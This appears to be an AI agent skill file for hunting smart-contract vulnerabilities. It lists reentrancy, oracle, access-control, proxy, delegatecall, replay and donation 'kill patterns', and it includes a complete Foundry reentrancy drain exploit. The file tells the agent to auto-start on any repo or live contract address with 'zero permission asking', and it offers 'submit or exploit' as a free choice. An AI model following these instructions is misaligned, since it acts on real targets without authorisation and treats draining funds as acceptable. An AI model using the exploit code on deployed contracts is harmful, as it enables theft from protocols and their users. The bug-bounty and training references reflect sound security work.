---
name: web3-security
description: Use when user says "web3 စစ်", "contract စစ်", "defi ဖောက်", "solidity စစ်", "web3 hack", "smart contract vulnerability". Hunts million-dollar bugs in smart contracts - reentrancy, oracle manipulation, access control bypass, flashloan exploits. Writes working PoCs, chains exploits, maximizes impact. Zero theory - pure attack.
---

# Web3 Attack Methodology

## TRIGGER
**Auto-activate when:**
- "web3 စစ်", "contract စစ်", "defi ဖောက်", "solidity စစ်"
- User provides GitHub repo with .sol files
- User provides contract address (0x...)
- "audit", "hack web3", "find bug"

**Start Phase 0 immediately. Zero permission asking.**

---

## WEB3 = REAL MONEY HACKING

```
Web2: Find XSS → Pop alert() → $500 bounty
Web3: Find reentrancy → Drain $50M → Career-making bounty

Deployed code = LIVE = REAL MONEY flowing
One bug = Instant millionaire OR project death
Code is law. No undo button.
```

---

## ATTACK WORKFLOW

User says: **"စစ်လိုက် <target>"**

```bash
# 1. GET CODE (30 sec)
git clone <repo> && cd <repo>
# OR if contract address: scrape from Etherscan

# 2. AUTO SCAN (2 min)
slither . --detect reentrancy-eth,arbitrary-send-eth,suicidal,uninitialized-state,controlled-delegatecall

# 3. FIND MONEY FUNCTIONS (1 min)
grep -rn "transfer\|withdraw\|mint\|burn\|call{value" src/
grep -rn "delegatecall\|selfdestruct" src/

# 4. HUNT CRITICAL (10 min focus)
→ Reentrancy in withdraw/transfer
→ Access control missing on mint/burn
→ Oracle manipulation in getPrice
→ Unprotected initialize() 
→ Flashloan attack vectors

# 5. WRITE POC (Foundry)
→ Prove the drain
→ Show the numbers
→ Submit or exploit (ethical choice)
```

---

## PHASE 0: RECON

```bash
# TARGET INPUT
GitHub repo → clone → scan
Contract address → Etherscan → scrape source → scan
Project name → Google → find GitHub → scan

# FIND THE MONEY
src/ → Read every .sol
Focus pattern:
  function withdraw() ← MONEY OUT
  function mint()     ← PRINT MONEY
  function transfer() ← MOVE MONEY
  function deposit()  ← MONEY IN

# MAP ATTACK SURFACE
External functions = entry points
Public state variables = info leak
Admin functions = privilege escalation targets
Oracle calls = price manipulation targets

# TOOLS (install once)
curl -L https://foundry.paradigm.xyz | bash && foundryup
pip3 install slither-analyzer
```

---

## PHASE 1: AUTO SCAN (5 min)

```bash
# RUN SLITHER - only critical detectors
slither . --detect reentrancy-eth,arbitrary-send-eth,suicidal,controlled-delegatecall,uninitialized-state,tx-origin

# READ OUTPUT
HIGH/CRITICAL → Write PoC NOW
MEDIUM → Check if chainable with other bugs
LOW/INFO → Ignore

# PATTERN GREP (faster than reading)
grep -rn "\.call{value" src/          # Potential reentrancy
grep -rn "delegatecall" src/          # Potential takeover
grep -rn "tx\.origin" src/            # Auth bypass
grep -rn "block\.timestamp" src/      # Timestamp manipulation
grep -rn "selfdestruct\|suicide" src/ # Contract destruction
```

---

## PHASE 2: KILL CHAIN HUNTING

### 🎯 CRITICAL BUGS (Instant millions)

#### 1️⃣ **REENTRANCY** → #1 Money Printer

```solidity
// KILL PATTERN
function withdraw(uint amount) external {
    (bool ok,) = msg.sender.call{value: amount}("");  // ← PAY FIRST
    balances[msg.sender] -= amount;                   // ← UPDATE AFTER = DEAD
}

// YOUR EXPLOIT
receive() external payable {
    victim.withdraw(1 ether);  // Loop until drained
}
```

**Find it:**
```bash
grep -rn "\.call{value.*}(" src/
# If balance update comes AFTER .call → VULNERABLE
# Write PoC → Drain → Submit
```

**PoC:**
```bash
forge test --match-test testReentrancy -vvvv
# See: reentrancy-poc.sol in this skill folder
```

---

#### 2️⃣ **ORACLE MANIPULATION** → DeFi Instant Death

```solidity
// KILL PATTERN
uint price = pool.getReserves();  // ← SPOT PRICE = MANIPULABLE
uint collateral = userBalance * price;
```

**Attack:**
```
1. Flashloan $10M
2. Dump into pool → price tanks/moons
3. Borrow max at fake price
4. Restore pool, repay loan
5. Keep the difference = Profit
```

**Find it:**
```bash
grep -rn "getReserves\|balanceOf.*pair\|balanceOf.*pool" src/
# Using pool balance as oracle? → DEAD
# No TWAP? → DEAD
# Single oracle source? → MANIPULABLE
```

**PoC:** See `oracle-manipulation-poc.sol`

---

#### 3️⃣ **ACCESS CONTROL** → Become God

```solidity
// KILL PATTERN
function mint(address to, uint amount) external {  // ← NO MODIFIER
    balances[to] += amount;  // Anyone can print money
}

function setOwner(address newOwner) public {  // ← NO CHECK
    owner = newOwner;  // Anyone becomes owner
}
```

**Find it:**
```bash
grep -rn "function.*mint\|function.*burn\|function.*set.*owner" src/ | grep -v "onlyOwner\|onlyAdmin\|require(msg.sender"
# If admin function has NO modifier → Call it → Own the protocol
```

**PoC:** See `access-control-poc.sol`

---

#### 4️⃣ **UNINITIALIZED PROXY** → Frontrun Takeover

```solidity
// KILL PATTERN
function initialize(address _owner) external {  // ← NO PROTECTION
    owner = _owner;
}
// Deployed but not initialized → Frontrun → Become owner
```

**Find it:**
```bash
grep -rn "function initialize" src/
# If no "initializer" modifier → Frontrunnable
# Check deployment script - if initialize() called in separate tx → RACE
```

---

#### 5️⃣ **DELEGATECALL** → Full Contract Takeover

```solidity
// KILL PATTERN
function execute(address target, bytes data) external {
    target.delegatecall(data);  // ← USER CONTROLS TARGET
}
// Call with selfdestruct → Contract nuked
```

**Find it:**
```bash
grep -rn "delegatecall" src/
# If user controls target address → selfdestruct possible
```

---

#### 6️⃣ **SIGNATURE REPLAY** → Unlimited Use

```solidity
// KILL PATTERN
function claim(uint amount, bytes sig) external {
    require(ecrecover(hash, sig) == signer);  // ← NO NONCE
    transfer(msg.sender, amount);
}
// Use same signature infinite times
```

**Find it:**
```bash
grep -rn "ecrecover" src/
# No nonce tracking? → Replayable
# No chainId? → Cross-chain replay
```

---

#### 7️⃣ **DONATION ATTACK** → Steal All Shares

```solidity
// KILL PATTERN
shares = amount * totalShares / totalAssets;  // ← ROUNDING
// First depositor donates → rounding kills next depositors
```

**Find it:**
```bash
grep -rn "totalShares.*totalAssets\|totalSupply.*total" src/
# Division without minimum deposit? → Exploitable
```

---

#### 8️⃣ **tx.origin AUTH** → Phishing Bypass

```solidity
// KILL PATTERN
require(tx.origin == owner);  // ← WRONG AUTH
// Trick owner to call malicious contract → bypass
```

**Find it:**
```bash
grep -rn "tx\.origin" src/
# Using tx.origin for auth? → Phishable
```

---

## PHASE 3: PROOF OR GTFO

**Rule: No PoC = No bug**

Template:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableContract.sol";

contract ExploitTest is Test {
    VulnerableContract target;
    Attacker attacker;
    
    function setUp() public {
        // Deploy contracts
        target = new VulnerableContract();
        vm.deal(address(target), 100 ether);  // Fund target
        
        attacker = new Attacker(address(target));
        vm.deal(address(attacker), 1 ether);
    }
    
    function testExploit() public {
        console.log("=== BEFORE EXPLOIT ===");
        console.log("Target balance:", address(target).balance);
        console.log("Attacker balance:", address(attacker).balance);
        
        // Execute exploit
        attacker.attack{value: 1 ether}();
        
        console.log("\n=== AFTER EXPLOIT ===");
        console.log("Target balance:", address(target).balance);
        console.log("Attacker balance:", address(attacker).balance);
        console.log("Profit:", address(attacker).balance - 1 ether);
        
        // Verify impact
        assertEq(address(target).balance, 0, "Target should be drained");
        assertGt(address(attacker).balance, 1 ether, "Attacker should profit");
    }
}

contract Attacker {
    VulnerableContract target;
    
    constructor(address _target) {
        target = VulnerableContract(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
}
```

**Run:**
```bash
forge test --match-test testExploit -vvvv
```

**Output must show:**
- Before: Target has $X
- After: Target has $0, Attacker has $X
- Profit calculation

---

## PHASE 4: CASH OUT

Report format:
```
[CRITICAL] Reentrancy drains entire contract

File: src/Vault.sol:45
Bug: External call before balance update

Impact:
- Total loss: $50M (current TVL)
- Attack cost: $0
- Time: Single transaction

PoC:
forge test --match-test testReentrancyExploit -vvvv

Output:
Before: Vault = 50M ETH
After:  Vault = 0 ETH, Attacker = 50M ETH

Fix: Update balance before .call
```

**Payout tiers:**
```
$1M+:    Direct fund theft, unlimited minting
$100k+:  Conditional theft, price manipulation
$10k+:   Griefing, DOS, access control
$1k+:    Info leaks, low-impact bugs
```

---

## COMMAND CHEAT SHEET

```bash
# GET TARGET
git clone <repo> && cd <repo>

# SCAN
slither . --detect reentrancy-eth,arbitrary-send-eth,suicidal,controlled-delegatecall,uninitialized-state

# HUNT
grep -rn "\.call{value\|delegatecall\|tx\.origin" src/
grep -rn "function.*withdraw\|mint\|burn" src/

# POC
forge test --match-test testExploit -vvvv

# FUZZ (find edge cases)
forge test --fuzz-runs 10000
```

---

## REAL KILLS (2026)

```
$387M - Bitget (Private key leak)
$320M - Liquid Network (Hot wallet)
$290M - KelpDao (Bridge signature bypass)
$130M - Cold Card (Multisig flaw)
$120M - Tectonic (Oracle manipulation)

Pattern: 40% private key, 30% smart contract, 20% bridge, 10% other
Lesson: Code is perfect. Humans fuck up.
```

---

## TOOLS

```bash
# SCANNER
pip3 install slither-analyzer
slither . --detect reentrancy-eth,arbitrary-send-eth

# FUZZER
forge test --fuzz-runs 10000

# BLOCKCHAIN
Tenderly.co       - Debug any transaction
Phalcon.BlockSec  - Analyze hacks
Etherscan         - Read verified code
DethCode          - Browse contracts like GitHub

# MONEY
Immunefi.com      - $50k-$10M bounties
Code4rena.com     - Audit contests
Rekt.news         - Learn from corpses
```

---

## LEARNING PATH

```
Week 1-2: Learn Solidity
→ CryptoZombies.io
→ Ethernaut challenges (29 levels)
→ Write basic contracts

Week 3-4: Break Shit
→ Damn Vulnerable DeFi (18 challenges)
→ Write exploits for each
→ Understand WHY it broke

Month 2: Hunt
→ Pick Immunefi project (<$1M TVL)
→ Scan → Hunt → PoC
→ Submit first bug (even if INFO)

Month 3+: Scale
→ Target $10M+ TVL projects
→ Specialize (DeFi/Bridge/Oracle)
→ Read Rekt postmortems
→ Join security Discords

Goal: First paid bug by Month 3
```

---

## 1-HOUR QUICK AUDIT

```bash
# 10 min: Scan
slither . --detect reentrancy-eth,arbitrary-send-eth,suicidal,controlled-delegatecall

# 20 min: Grep critical patterns
grep -rn "\.call{value\|delegatecall\|tx\.origin" src/
grep -rn "function.*withdraw\|mint\|burn" src/ | grep -v "onlyOwner\|onlyAdmin"

# 30 min: Read money functions
→ Every withdraw/transfer/mint/burn
→ Check: CEI pattern? Access control? Oracle trust?

# If found: Write PoC, submit
# If nothing: Move to next target
```

---

## MINDSET

```
Web2: Break website, earn $500
Web3: Steal $50M, earn $5M bounty

One bug = Life changing money
Code = Law = No undo
Your job: Find the line that breaks the bank
```

---

## RESOURCES

```
Learn:
- damnvulnerabledefi.xyz (18 challenges)
- ethernaut.openzeppelin.com (29 levels)

Hunt:
- immunefi.com (bounties)
- code4rena.com (contests)

Study:
- rekt.news (learn from kills)
- github.com/sirhashalot/SCV-List (vulnerability db)
```

---

**READY? → "စစ်လိုက် <target>"**
